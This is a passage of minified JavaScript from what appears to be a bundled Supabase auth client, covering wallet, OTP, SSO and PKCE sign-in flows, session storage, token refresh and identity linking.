n;if(!t||!t.session||!t.user){const e=new Kn;return this._returnResult({data:{user:null,session:null},error:e})}return t.session&&(await this._saveSession(t.session),await this._notifyAllSubscribers("SIGNED_IN",t.session)),this._returnResult({data:Object.assign({},t),error:n})}catch(p){if(Bn(p))return this._returnResult({data:{user:null,session:null},error:p});throw p}}async signInWithSolana(e){var t,n,r,a,s,o,i,l,c,u,d,h;let f,p;if("message"in e)f=e.message,p=e.signature;else{const{chain:d,wallet:h,statement:m,options:g}=e;let v;if(dr())if("object"===typeof h)v=h;else{const e=window;if(!("solana"in e)||"object"!==typeof e.solana||!("signIn"in e.solana&&"function"===typeof e.solana.signIn||"signMessage"in e.solana&&"function"===typeof e.solana.signMessage))throw new Error("@supabase/auth-js: No compatible Solana wallet interface on the window object (window.solana) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'solana', wallet: resolvedUserWallet }) instead.");v=e.solana}else{if("object"!==typeof h||!(null===g||void 0===g?void 0:g.url))throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");v=h}const y=new URL(null!==(t=null===g||void 0===g?void 0:g.url)&&void 0!==t?t:window.location.href);if("signIn"in v&&v.signIn){const e=await v.signIn(Object.assign(Object.assign(Object.assign({issuedAt:(new Date).toISOString()},null===g||void 0===g?void 0:g.signInWithSolana),{version:"1",domain:y.host,uri:y.href}),m?{statement:m}:null));let t;if(Array.isArray(e)&&e[0]&&"object"===typeof e[0])t=e[0];else{if(!(e&&"object"===typeof e&&"signedMessage"in e&&"signature"in e))throw new Error("@supabase/auth-js: Wallet method signIn() returned unrecognized value");t=e}if(!("signedMessage"in t&&"signature"in t&&("string"===typeof t.signedMessage||t.signedMessage instanceof Uint8Array)&&t.signature instanceof Uint8Array))throw new Error("@supabase/auth-js: Wallet method signIn() API returned object without signedMessage and signature fields");f="string"===typeof t.signedMessage?t.signedMessage:(new TextDecoder).decode(t.signedMessage),p=t.signature}else{if(!("signMessage"in v)||"function"!==typeof v.signMessage||!("publicKey"in v)||"object"!==typeof v||!v.publicKey||!("toBase58"in v.publicKey)||"function"!==typeof v.publicKey.toBase58)throw new Error("@supabase/auth-js: Wallet does not have a compatible signMessage() and publicKey.toBase58() API");f=["".concat(y.host," wants you to sign in with your Solana account:"),v.publicKey.toBase58(),...m?["",m,""]:[""],"Version: 1","URI: ".concat(y.href),"Issued At: ".concat(null!==(r=null===(n=null===g||void 0===g?void 0:g.signInWithSolana)||void 0===n?void 0:n.issuedAt)&&void 0!==r?r:(new Date).toISOString()),...(null===(a=null===g||void 0===g?void 0:g.signInWithSolana)||void 0===a?void 0:a.notBefore)?["Not Before: ".concat(g.signInWithSolana.notBefore)]:[],...(null===(s=null===g||void 0===g?void 0:g.signInWithSolana)||void 0===s?void 0:s.expirationTime)?["Expiration Time: ".concat(g.signInWithSolana.expirationTime)]:[],...(null===(o=null===g||void 0===g?void 0:g.signInWithSolana)||void 0===o?void 0:o.chainId)?["Chain ID: ".concat(g.signInWithSolana.chainId)]:[],...(null===(i=null===g||void 0===g?void 0:g.signInWithSolana)||void 0===i?void 0:i.nonce)?["Nonce: ".concat(g.signInWithSolana.nonce)]:[],...(null===(l=null===g||void 0===g?void 0:g.signInWithSolana)||void 0===l?void 0:l.requestId)?["Request ID: ".concat(g.signInWithSolana.requestId)]:[],...(null===(u=null===(c=null===g||void 0===g?void 0:g.signInWithSolana)||void 0===c?void 0:c.resources)||void 0===u?void 0:u.length)?["Resources",...g.signInWithSolana.resources.map(e=>"- ".concat(e))]:[]].join("\n");const e=await v.signMessage((new TextEncoder).encode(f),"utf8");if(!e||!(e instanceof Uint8Array))throw new Error("@supabase/auth-js: Wallet signMessage() API returned an recognized value");p=e}}try{const{data:t,error:n}=await Pr(this.fetch,"POST","".concat(this.url,"/token?grant_type=web3"),{headers:this.headers,body:Object.assign({chain:"solana",message:f,signature:ur(p)},(null===(d=e.options)||void 0===d?void 0:d.captchaToken)?{gotrue_meta_security:{captcha_token:null===(h=e.options)||void 0===h?void 0:h.captchaToken}}:null),xform:Or});if(n)throw n;if(!t||!t.session||!t.user){const e=new Kn;return this._returnResult({data:{user:null,session:null},error:e})}return t.session&&(await this._saveSession(t.session),await this._notifyAllSubscribers("SIGNED_IN",t.session)),this._returnResult({data:Object.assign({},t),error:n})}catch(m){if(Bn(m))return this._returnResult({data:{user:null,session:null},error:m});throw m}}async _exchangeCodeForSession(e){const t=await gr(this.storage,"".concat(this.storageKey,"-code-verifier")),[n,r]=(null!==t&&void 0!==t?t:"").split("/");try{if(!n&&"pkce"===this.flowType)throw new Qn;const{data:t,error:a}=await Pr(this.fetch,"POST","".concat(this.url,"/token?grant_type=pkce"),{headers:this.headers,body:{auth_code:e,code_verifier:n},xform:Or});if(await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),a)throw a;if(!t||!t.session||!t.user){const e=new Kn;return this._returnResult({data:{user:null,session:null,redirectType:null},error:e})}return t.session&&(await this._saveSession(t.session),await this._notifyAllSubscribers("SIGNED_IN",t.session)),this._returnResult({data:Object.assign(Object.assign({},t),{redirectType:null!==r&&void 0!==r?r:null}),error:a})}catch(a){if(await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),Bn(a))return this._returnResult({data:{user:null,session:null,redirectType:null},error:a});throw a}}async signInWithIdToken(e){try{const{options:t,provider:n,token:r,access_token:a,nonce:s}=e,o=await Pr(this.fetch,"POST","".concat(this.url,"/token?grant_type=id_token"),{headers:this.headers,body:{provider:n,id_token:r,access_token:a,nonce:s,gotrue_meta_security:{captcha_token:null===t||void 0===t?void 0:t.captchaToken}},xform:Or}),{data:i,error:l}=o;if(l)return this._returnResult({data:{user:null,session:null},error:l});if(!i||!i.session||!i.user){const e=new Kn;return this._returnResult({data:{user:null,session:null},error:e})}return i.session&&(await this._saveSession(i.session),await this._notifyAllSubscribers("SIGNED_IN",i.session)),this._returnResult({data:i,error:l})}catch(t){if(Bn(t))return this._returnResult({data:{user:null,session:null},error:t});throw t}}async signInWithOtp(e){var t,n,r,a,s;try{if("email"in e){const{email:r,options:a}=e;let s=null,o=null;"pkce"===this.flowType&&([s,o]=await kr(this.storage,this.storageKey));const{error:i}=await Pr(this.fetch,"POST","".concat(this.url,"/otp"),{headers:this.headers,body:{email:r,data:null!==(t=null===a||void 0===a?void 0:a.data)&&void 0!==t?t:{},create_user:null===(n=null===a||void 0===a?void 0:a.shouldCreateUser)||void 0===n||n,gotrue_meta_security:{captcha_token:null===a||void 0===a?void 0:a.captchaToken},code_challenge:s,code_challenge_method:o},redirectTo:null===a||void 0===a?void 0:a.emailRedirectTo});return this._returnResult({data:{user:null,session:null},error:i})}if("phone"in e){const{phone:t,options:n}=e,{data:o,error:i}=await Pr(this.fetch,"POST","".concat(this.url,"/otp"),{headers:this.headers,body:{phone:t,data:null!==(r=null===n||void 0===n?void 0:n.data)&&void 0!==r?r:{},create_user:null===(a=null===n||void 0===n?void 0:n.shouldCreateUser)||void 0===a||a,gotrue_meta_security:{captcha_token:null===n||void 0===n?void 0:n.captchaToken},channel:null!==(s=null===n||void 0===n?void 0:n.channel)&&void 0!==s?s:"sms"}});return this._returnResult({data:{user:null,session:null,messageId:null===o||void 0===o?void 0:o.message_id},error:i})}throw new Gn("You must provide either an email or phone number.")}catch(o){if(await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),Bn(o))return this._returnResult({data:{user:null,session:null},error:o});throw o}}async verifyOtp(e){var t,n;try{let r,a;"options"in e&&(r=null===(t=e.options)||void 0===t?void 0:t.redirectTo,a=null===(n=e.options)||void 0===n?void 0:n.captchaToken);const{data:s,error:o}=await Pr(this.fetch,"POST","".concat(this.url,"/verify"),{headers:this.headers,body:Object.assign(Object.assign({},e),{gotrue_meta_security:{captcha_token:a}}),redirectTo:r,xform:Or});if(o)throw o;if(!s){throw new Error("An error occurred on token verification.")}const i=s.session,l=s.user;return(null===i||void 0===i?void 0:i.access_token)&&(await this._saveSession(i),await this._notifyAllSubscribers("recovery"==e.type?"PASSWORD_RECOVERY":"SIGNED_IN",i)),this._returnResult({data:{user:l,session:i},error:null})}catch(r){if(Bn(r))return this._returnResult({data:{user:null,session:null},error:r});throw r}}async signInWithSSO(e){var t,n,r,a,s;try{let o=null,i=null;"pkce"===this.flowType&&([o,i]=await kr(this.storage,this.storageKey));const l=await Pr(this.fetch,"POST","".concat(this.url,"/sso"),{body:Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},"providerId"in e?{provider_id:e.providerId}:null),"domain"in e?{domain:e.domain}:null),{redirect_to:null!==(n=null===(t=e.options)||void 0===t?void 0:t.redirectTo)&&void 0!==n?n:void 0}),(null===(r=null===e||void 0===e?void 0:e.options)||void 0===r?void 0:r.captchaToken)?{gotrue_meta_security:{captcha_token:e.options.captchaToken}}:null),{skip_http_redirect:!0,code_challenge:o,code_challenge_method:i}),headers:this.headers,xform:Lr});return(null===(a=l.data)||void 0===a?void 0:a.url)&&dr()&&!(null===(s=e.options)||void 0===s?void 0:s.skipBrowserRedirect)&&window.location.assign(l.data.url),this._returnResult(l)}catch(o){if(await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),Bn(o))return this._returnResult({data:null,error:o});throw o}}async reauthenticate(){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._reauthenticate())}async _reauthenticate(){try{return await this._useSession(async e=>{const{data:{session:t},error:n}=e;if(n)throw n;if(!t)throw new Wn;const{error:r}=await Pr(this.fetch,"GET","".concat(this.url,"/reauthenticate"),{headers:this.headers,jwt:t.access_token});return this._returnResult({data:{user:null,session:null},error:r})})}catch(e){if(Bn(e))return this._returnResult({data:{user:null,session:null},error:e});throw e}}async resend(e){try{const t="".concat(this.url,"/resend");if("email"in e){const{email:n,type:r,options:a}=e,{error:s}=await Pr(this.fetch,"POST",t,{headers:this.headers,body:{email:n,type:r,gotrue_meta_security:{captcha_token:null===a||void 0===a?void 0:a.captchaToken}},redirectTo:null===a||void 0===a?void 0:a.emailRedirectTo});return this._returnResult({data:{user:null,session:null},error:s})}if("phone"in e){const{phone:n,type:r,options:a}=e,{data:s,error:o}=await Pr(this.fetch,"POST",t,{headers:this.headers,body:{phone:n,type:r,gotrue_meta_security:{captcha_token:null===a||void 0===a?void 0:a.captchaToken}}});return this._returnResult({data:{user:null,session:null,messageId:null===s||void 0===s?void 0:s.message_id},error:o})}throw new Gn("You must provide either an email or phone number and a type")}catch(t){if(Bn(t))return this._returnResult({data:{user:null,session:null},error:t});throw t}}async getSession(){await this.initializePromise;return await this._acquireLock(this.lockAcquireTimeout,async()=>this._useSession(async e=>e))}async _acquireLock(e,t){this._debug("#_acquireLock","begin",e);try{if(this.lockAcquired){const e=this.pendingInLock.length?this.pendingInLock[this.pendingInLock.length-1]:Promise.resolve(),n=(async()=>(await e,await t()))();return this.pendingInLock.push((async()=>{try{await n}catch(Oa){}})()),n}return await this.lock("lock:".concat(this.storageKey),e,async()=>{this._debug("#_acquireLock","lock acquired for storage key",this.storageKey);try{this.lockAcquired=!0;const e=t();for(this.pendingInLock.push((async()=>{try{await e}catch(Oa){}})()),await e;this.pendingInLock.length;){const e=[...this.pendingInLock];await Promise.all(e),this.pendingInLock.splice(0,e.length)}return await e}finally{this._debug("#_acquireLock","lock released for storage key",this.storageKey),this.lockAcquired=!1}})}finally{this._debug("#_acquireLock","end")}}async _useSession(e){this._debug("#_useSession","begin");try{const t=await this.__loadSession();return await e(t)}finally{this._debug("#_useSession","end")}}async __loadSession(){this._debug("#__loadSession()","begin"),this.lockAcquired||this._debug("#__loadSession()","used outside of an acquired lock!",(new Error).stack);try{let e=null;const t=await gr(this.storage,this.storageKey);if(this._debug("#getSession()","session from storage",t),null!==t&&(this._isValidSession(t)?e=t:(this._debug("#getSession()","session from storage is not valid"),await this._removeSession())),!e)return{data:{session:null},error:null};const n=!!e.expires_at&&1e3*e.expires_at-Date.now()<In;if(this._debug("#__loadSession()","session has".concat(n?"":" not"," expired"),"expires_at",e.expires_at),!n){if(this.userStorage){const t=await gr(this.userStorage,this.storageKey+"-user");(null===t||void 0===t?void 0:t.user)?e.user=t.user:e.user=jr()}if(this.storage.isServer&&e.user&&!e.user.__isUserNotAvailableProxy){const t={value:this.suppressGetSessionWarning};e.user=function(e,t){return new Proxy(e,{get:(e,n,r)=>{if("__isInsecureUserWarningProxy"===n)return!0;if("symbol"===typeof n){const t=n.toString();if("Symbol(Symbol.toPrimitive)"===t||"Symbol(Symbol.toStringTag)"===t||"Symbol(util.inspect.custom)"===t||"Symbol(nodejs.util.inspect.custom)"===t)return Reflect.get(e,n,r)}return t.value||"string"!==typeof n||(console.warn("Using the user object as returned from supabase.auth.getSession() or from some supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from the storage medium (usually cookies on the server) and may not be authentic. Use supabase.auth.getUser() instead which authenticates the data by contacting the Supabase Auth server."),t.value=!0),Reflect.get(e,n,r)}})}(e.user,t),t.value&&(this.suppressGetSessionWarning=!0)}return{data:{session:e},error:null}}const{data:r,error:a}=await this._callRefreshToken(e.refresh_token);return a?this._returnResult({data:{session:null},error:a}):this._returnResult({data:{session:r},error:null})}finally{this._debug("#__loadSession()","end")}}async getUser(e){if(e)return await this._getUser(e);await this.initializePromise;const t=await this._acquireLock(this.lockAcquireTimeout,async()=>await this._getUser());return t.data.user&&(this.suppressGetSessionWarning=!0),t}async _getUser(e){try{return e?await Pr(this.fetch,"GET","".concat(this.url,"/user"),{headers:this.headers,jwt:e,xform:Ir}):await this._useSession(async e=>{var t,n,r;const{data:a,error:s}=e;if(s)throw s;return(null===(t=a.session)||void 0===t?void 0:t.access_token)||this.hasCustomAuthorizationHeader?await Pr(this.fetch,"GET","".concat(this.url,"/user"),{headers:this.headers,jwt:null!==(r=null===(n=a.session)||void 0===n?void 0:n.access_token)&&void 0!==r?r:void 0,xform:Ir}):{data:{user:null},error:new Wn}})}catch(t){if(Bn(t))return Hn(t)&&(await this._removeSession(),await vr(this.storage,"".concat(this.storageKey,"-code-verifier"))),this._returnResult({data:{user:null},error:t});throw t}}async updateUser(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._updateUser(e,t))}async _updateUser(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};try{return await this._useSession(async n=>{const{data:r,error:a}=n;if(a)throw a;if(!r.session)throw new Wn;const s=r.session;let o=null,i=null;"pkce"===this.flowType&&null!=e.email&&([o,i]=await kr(this.storage,this.storageKey));const{data:l,error:c}=await Pr(this.fetch,"PUT","".concat(this.url,"/user"),{headers:this.headers,redirectTo:null===t||void 0===t?void 0:t.emailRedirectTo,body:Object.assign(Object.assign({},e),{code_challenge:o,code_challenge_method:i}),jwt:s.access_token,xform:Ir});if(c)throw c;return s.user=l.user,await this._saveSession(s),await this._notifyAllSubscribers("USER_UPDATED",s),this._returnResult({data:{user:s.user},error:null})})}catch(n){if(await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),Bn(n))return this._returnResult({data:{user:null},error:n});throw n}}async setSession(e){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._setSession(e))}async _setSession(e){try{if(!e.access_token||!e.refresh_token)throw new Wn;const t=Date.now()/1e3;let n=t,r=!0,a=null;const{payload:s}=br(e.access_token);if(s.exp&&(n=s.exp,r=n<=t),r){const{data:t,error:n}=await this._callRefreshToken(e.refresh_token);if(n)return this._returnResult({data:{user:null,session:null},error:n});if(!t)return{data:{user:null,session:null},error:null};a=t}else{const{data:r,error:s}=await this._getUser(e.access_token);if(s)return this._returnResult({data:{user:null,session:null},error:s});a={access_token:e.access_token,refresh_token:e.refresh_token,user:r.user,token_type:"bearer",expires_in:n-t,expires_at:n},await this._saveSession(a),await this._notifyAllSubscribers("SIGNED_IN",a)}return this._returnResult({data:{user:a.user,session:a},error:null})}catch(t){if(Bn(t))return this._returnResult({data:{session:null,user:null},error:t});throw t}}async refreshSession(e){return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._refreshSession(e))}async _refreshSession(e){try{return await this._useSession(async t=>{var n;if(!e){const{data:r,error:a}=t;if(a)throw a;e=null!==(n=r.session)&&void 0!==n?n:void 0}if(!(null===e||void 0===e?void 0:e.refresh_token))throw new Wn;const{data:r,error:a}=await this._callRefreshToken(e.refresh_token);return a?this._returnResult({data:{user:null,session:null},error:a}):r?this._returnResult({data:{user:r.user,session:r},error:null}):this._returnResult({data:{user:null,session:null},error:null})})}catch(t){if(Bn(t))return this._returnResult({data:{user:null,session:null},error:t});throw t}}async _getSessionFromURL(e,t){try{if(!dr())throw new Jn("No browser detected.");if(e.error||e.error_description||e.error_code)throw new Jn(e.error_description||"Error in URL with unspecified error_description",{error:e.error||"unspecified_error",code:e.error_code||"unspecified_code"});switch(t){case"implicit":if("pkce"===this.flowType)throw new $n("Not a valid PKCE flow url.");break;case"pkce":if("implicit"===this.flowType)throw new Jn("Not a valid implicit grant flow url.")}if("pkce"===t){if(this._debug("#_initialize()","begin","is PKCE flow",!0),!e.code)throw new $n("No code detected.");const{data:t,error:n}=await this._exchangeCodeForSession(e.code);if(n)throw n;const r=new URL(window.location.href);return r.searchParams.delete("code"),window.history.replaceState(window.history.state,"",r.toString()),{data:{session:t.session,redirectType:null},error:null}}const{provider_token:n,provider_refresh_token:r,access_token:a,refresh_token:s,expires_in:o,expires_at:i,token_type:l}=e;if(!a||!o||!s||!l)throw new Jn("No session defined in URL");const c=Math.round(Date.now()/1e3),u=parseInt(o);let d=c+u;i&&(d=parseInt(i));const h=d-c;1e3*h<=An&&console.warn("@supabase/gotrue-js: Session as retrieved from URL expires in ".concat(h,"s, should have been closer to ").concat(u,"s"));const f=d-u;c-f>=120?console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",f,d,c):c-f<0&&console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clock for skew",f,d,c);const{data:p,error:m}=await this._getUser(a);if(m)throw m;const g={provider_token:n,provider_refresh_token:r,access_token:a,expires_in:u,expires_at:d,refresh_token:s,token_type:l,user:p.user};return window.location.hash="",this._debug("#_getSessionFromURL()","clearing window.location.hash"),this._returnResult({data:{session:g,redirectType:e.type},error:null})}catch(n){if(Bn(n))return this._returnResult({data:{session:null,redirectType:null},error:n});throw n}}_isImplicitGrantCallback(e){return"function"===typeof this.detectSessionInUrl?this.detectSessionInUrl(new URL(window.location.href),e):Boolean(e.access_token||e.error_description)}async _isPKCECallback(e){const t=await gr(this.storage,"".concat(this.storageKey,"-code-verifier"));return!(!e.code||!t)}async signOut(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{scope:"global"};return await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>await this._signOut(e))}async _signOut(){let{scope:e}=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{scope:"global"};return await this._useSession(async t=>{var n;const{data:r,error:a}=t;if(a&&!Hn(a))return this._returnResult({error:a});const s=null===(n=r.session)||void 0===n?void 0:n.access_token;if(s){const{error:t}=await this.admin.signOut(s,e);if(t&&(!function(e){return Bn(e)&&"AuthApiError"===e.name}(t)||404!==t.status&&401!==t.status&&403!==t.status)&&!Hn(t))return this._returnResult({error:t})}return"others"!==e&&(await this._removeSession(),await vr(this.storage,"".concat(this.storageKey,"-code-verifier"))),this._returnResult({error:null})})}onAuthStateChange(e){const t=Symbol("auth-callback"),n={id:t,callback:e,unsubscribe:()=>{this._debug("#unsubscribe()","state change callback with id removed",t),this.stateChangeEmitters.delete(t)}};return this._debug("#onAuthStateChange()","registered callback with id",t),this.stateChangeEmitters.set(t,n),(async()=>{await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>{this._emitInitialSession(t)})})(),{data:{subscription:n}}}async _emitInitialSession(e){return await this._useSession(async t=>{var n,r;try{const{data:{session:r},error:a}=t;if(a)throw a;await(null===(n=this.stateChangeEmitters.get(e))||void 0===n?void 0:n.callback("INITIAL_SESSION",r)),this._debug("INITIAL_SESSION","callback id",e,"session",r)}catch(a){await(null===(r=this.stateChangeEmitters.get(e))||void 0===r?void 0:r.callback("INITIAL_SESSION",null)),this._debug("INITIAL_SESSION","callback id",e,"error",a),console.error(a)}})}async resetPasswordForEmail(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=null,r=null;"pkce"===this.flowType&&([n,r]=await kr(this.storage,this.storageKey,!0));try{return await Pr(this.fetch,"POST","".concat(this.url,"/recover"),{body:{email:e,code_challenge:n,code_challenge_method:r,gotrue_meta_security:{captcha_token:t.captchaToken}},headers:this.headers,redirectTo:t.redirectTo})}catch(a){if(await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),Bn(a))return this._returnResult({data:null,error:a});throw a}}async getUserIdentities(){var e;try{const{data:t,error:n}=await this.getUser();if(n)throw n;return this._returnResult({data:{identities:null!==(e=t.user.identities)&&void 0!==e?e:[]},error:null})}catch(t){if(Bn(t))return this._returnResult({data:null,error:t});throw t}}async linkIdentity(e){return"token"in e?this.linkIdentityIdToken(e):this.linkIdentityOAuth(e)}async linkIdentityOAuth(e){var t;try{const{data:n,error:r}=await this._useSession(async t=>{var n,r,a,s,o;const{data:i,error:l}=t;if(l)throw l;const c=await this._getUrlForProvider("".concat(this.url,"/user/identities/authorize"),e.provider,{redirectTo:null===(n=e.options)||void 0===n?void 0:n.redirectTo,scopes:null===(r=e.options)||void 0===r?void 0:r.scopes,queryParams:null===(a=e.options)||void 0===a?void 0:a.queryParams,skipBrowserRedirect:!0});return await Pr(this.fetch,"GET",c,{headers:this.headers,jwt:null!==(o=null===(s=i.session)||void 0===s?void 0:s.access_token)&&void 0!==o?o:void 0})});if(r)throw r;return dr()&&!(null===(t=e.options)||void 0===t?void 0:t.skipBrowserRedirect)&&window.location.assign(null===n||void 0===n?void 0:n.url),this._returnResult({data:{provider:e.provider,url:null===n||void 0===n?void 0:n.url},error:null})}catch(n){if(Bn(n))return this._returnResult({data:{provider:e.provider,url:null},error:n});throw n}}async linkIdentityIdToken(e){return await this._useSession(async t=>{var n;try{const{error:r,data:{session:a}}=t;if(r)throw r;const{options:s,provider:o,token:i,access_token:l,nonce:c}=e,u=await Pr(this.fetch,"POST","".concat(this.url,"/token?grant_type=id_token"),{headers:this.headers,jwt:null!==(n=null===a||void 0===a?void 0:a.access_token)&&void 0!==n?n:void 0,body:{provider:o,id_token:i,access_token:l,nonce:c,link_identity:!0,gotrue_meta_security:{captcha_token:null===s||void 0===s?void 0:s.captchaToken}},xform:Or}),{data:d,error:h}=u;return h?this._returnResult({data:{user:null,session:null},error:h}):d&&d.session&&d.user?(d.session&&(await this._saveSession(d.session),await this._notifyAllSubscribers("USER_UPDATED",d.session)),this._returnResult({data:d,error:h})):this._returnResult({data:{user:null,session:null},error:new Kn})}catch(r){if(await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),Bn(r))return this._returnResult({data:{user:null,session:null},error:r});throw r}})}async unlinkIdentity(e){try{return await this._useSession(async t=>{var n,r;const{data:a,error:s}=t;if(s)throw s;return await Pr(this.fetch,"DELETE","".concat(this.url,"/user/identities/").concat(e.identity_id),{headers:this.headers,jwt:null!==(r=null===(n=a.session)||void 0===n?void 0:n.access_token)&&void 0!==r?r:void 0})})}catch(t){if(Bn(t))return this._returnResult({data:null,error:t});throw t}}async _refreshAccessToken(e){const t="#_refreshAccessToken(".concat(e.substring(0,5),"...)");this._debug(t,"begin");try{const a=Date.now();return await(n=async n=>(n>0&&await async function(e){return await new Promise(t=>{setTimeout(()=>t(null),e)})}(200*Math.pow(2,n-1)),this._debug(t,"refreshing attempt",n),await Pr(this.fetch,"POST","".concat(this.url,"/token?grant_type=refresh_token"),{body:{refresh_token:e},headers:this.headers,xform:Or})),r=(e,t)=>{const n=200*Math.pow(2,e);return t&&Xn(t)&&Date.now()+n-a<An},new Promise((e,t)=>{(async()=>{for(let a=0;a<1/0;a++)try{const t=await n(a);if(!r(a,null,t))return void e(t)}catch(Oa){if(!r(a,Oa))return void t(Oa)}})()}))}catch(a){if(this._debug(t,"error",a),Bn(a))return this._returnResult({data:{session:null,user:null},error:a});throw a}finally{this._debug(t,"end")}var n,r}_isValidSession(e){return"object"===typeof e&&null!==e&&"access_token"in e&&"refresh_token"in e&&"expires_at"in e}async _handleProviderSignIn(e,t){const n=await this._getUrlForProvider("".concat(this.url,"/authorize"),e,{redirectTo:t.redirectTo,scopes:t.scopes,queryParams:t.queryParams});return this._debug("#_handleProviderSignIn()","provider",e,"options",t,"url",n),dr()&&!t.skipBrowserRedirect&&window.location.assign(n),{data:{provider:e,url:n},error:null}}async _recoverAndRefresh(){var e,t;const n="#_recoverAndRefresh()";this._debug(n,"begin");try{const a=await gr(this.storage,this.storageKey);if(a&&this.userStorage){let t=await gr(this.userStorage,this.storageKey+"-user");this.storage.isServer||!Object.is(this.storage,this.userStorage)||t||(t={user:a.user},await mr(this.userStorage,this.storageKey+"-user",t)),a.user=null!==(e=null===t||void 0===t?void 0:t.user)&&void 0!==e?e:jr()}else if(a&&!a.user&&!a.user){const e=await gr(this.storage,this.storageKey+"-user");e&&(null===e||void 0===e?void 0:e.user)?(a.user=e.user,await vr(this.storage,this.storageKey+"-user"),await mr(this.storage,this.storageKey,a)):a.user=jr()}if(this._debug(n,"session from storage",a),!this._isValidSession(a))return this._debug(n,"session is not valid"),void(null!==a&&await this._removeSession());const s=1e3*(null!==(t=a.expires_at)&&void 0!==t?t:1/0)-Date.now()<In;if(this._debug(n,"session has".concat(s?"":" not"," expired with margin of ").concat(In,"s")),s){if(this.autoRefreshToken&&a.refresh_token){const{error:e}=await this._callRefreshToken(a.refresh_token);e&&(console.error(e),Xn(e)||(this._debug(n,"refresh failed with a non-retryable error, removing the session",e),await this._removeSession()))}}else if(a.user&&!0===a.user.__isUserNotAvailableProxy)try{const{data:e,error:t}=await this._getUser(a.access_token);!t&&(null===e||void 0===e?void 0:e.user)?(a.user=e.user,await this._saveSession(a),await this._notifyAllSubscribers("SIGNED_IN",a)):this._debug(n,"could not get user data, skipping SIGNED_IN notification")}catch(r){console.error("Error getting user data:",r),this._debug(n,"error getting user data, skipping SIGNED_IN notification",r)}else await this._notifyAllSubscribers("SIGNED_IN",a)}catch(a){return this._debug(n,"error",a),void console.error(a)}finally{this._debug(n,"end")}}async _callRefreshToken(e){var t,n;if(!e)throw new Wn;if(this.refreshingDeferred)return this.refreshingDeferred.promise;const r="#_callRefreshToken(".concat(e.substring(0,5),"...)");this._debug(r,"begin");try{this.refreshingDeferred=new yr;const{data:t,error:n}=await this._refreshAccessToken(e);if(n)throw n;if(!t.session)throw new Wn;await this._saveSession(t.session),await this._notifyAllSubscribers("TOKEN_REFRESHED",t.session);const r={data:t.session,error:null};return this.refreshingDeferred.resolve(r),r}catch(a){if(this._debug(r,"error",a),Bn(a)){const e={data:null,error:a};return Xn(a)||await this._removeSession(),null===(t=this.refreshingDeferred)||void 0===t||t.resolve(e),e}throw null===(n=this.refreshingDeferred)||void 0===n||n.reject(a),a}finally{this.refreshingDeferred=null,this._debug(r,"end")}}async _notifyAllSubscribers(e,t){let n=!(arguments.length>2&&void 0!==arguments[2])||arguments[2];const r="#_notifyAllSubscribers(".concat(e,")");this._debug(r,"begin",t,"broadcast = ".concat(n));try{this.broadcastChannel&&n&&this.broadcastChannel.postMessage({event:e,session:t});const r=[],a=Array.from(this.stateChangeEmitters.values()).map(async n=>{try{await n.callback(e,t)}catch(Oa){r.push(Oa)}});if(await Promise.all(a),r.length>0){for(let e=0;e<r.length;e+=1)console.error(r[e]);throw r[0]}}finally{this._debug(r,"end")}}async _saveSession(e){this._debug("#_saveSession()",e),this.suppressGetSessionWarning=!0,await vr(this.storage,"".concat(this.storageKey,"-code-verifier"));const t=Object.assign({},e),n=t.user&&!0===t.user.__isUserNotAvailableProxy;if(this.userStorage){!n&&t.user&&await mr(this.userStorage,this.storageKey+"-user",{user:t.user});const e=Object.assign({},t);delete e.user;const r=Tr(e);await mr(this.storage,this.storageKey,r)}else{const e=Tr(t);await mr(this.storage,this.storageKey,e)}}async _removeSession(){this._debug("#_removeSession()"),this.suppressGetSessionWarning=!1,await vr(this.storage,this.storageKey),await vr(this.storage,this.storageKey+"-code-verifier"),await vr(this.storage,this.storageKey+"-user"),this.userStorage&&await vr(this.userStorage,this.storageKey+"-user"),await this._notifyAllSubscribers("SIGNED_OUT",null)}_removeVisibilityChangedCallback(){this._debug("#_removeVisibilityChangedCallback()");const e=this.visibilityChangedCallback;this.visibilityChangedCallback=null;try{e&&dr()&&(null===window||void 0===window?void 0:window.removeEventListener)&&window.removeEventListener("visibilitychange",e)}catch(Oa){console.error("removing visibilitychange callback failed",Oa)}}async _startAutoRefresh(){await this._stopAutoRefresh(),this._debug("#_startAutoRefresh()");const e=setInterval(()=>this._autoRefreshTokenTick(),An);this.autoRefreshTicker=e,e&&"object"===typeof e&&"function"===typeof e.unref?e.unref():"undefined"!==typeof Deno&&"function"===typeof Deno.unrefTimer&&Deno.unrefTimer(e);const t=setTimeout(async()=>{await this.initializePromise,await this._autoRefreshTokenTick()},0);this.autoRefreshTickTimeout=t,t&&"object"===typeof t&&"function"===typeof t.unref?t.unref():"undefined"!==typeof Deno&&"function"===typeof Deno.unrefTimer&&Deno.unrefTimer(t)}async _stopAutoRefresh(){this._debug("#_stopAutoRefresh()");const e=this.autoRefreshTicker;this.autoRefreshTicker=null,e&&clearInterval(e);const t=this.autoRefreshTickTimeout;this.autoRefreshTickTimeout=null,t&&clearTimeout(t)}async startAutoRefresh(){this._removeVisibilityChangedCallback(),await this._startAutoRefresh()}async 